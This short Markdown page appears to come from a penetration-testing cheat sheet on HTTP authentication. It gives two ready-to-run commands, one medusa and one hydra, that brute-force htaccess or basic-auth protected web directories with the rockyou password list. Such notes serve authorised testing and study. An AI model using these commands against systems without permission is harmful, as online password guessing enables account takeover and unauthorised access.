---
title: HTTP Authentication
parent: Web
layout: default
nav_order: 3
---

1. `medusa -h 10.11.0.22 -u admin -P /usr/share/seclists/rockyou.txt -M http -m DIR:/admin -n PORT`\
   (Suitable for htaccess protected web dir. Replace -u with -U if have wordlist. dir with the directory path to crack.)
2. hydra:\
   `hydra -L user.txt -P /usr/share/seclists/rockyou.txt IP http-get /path`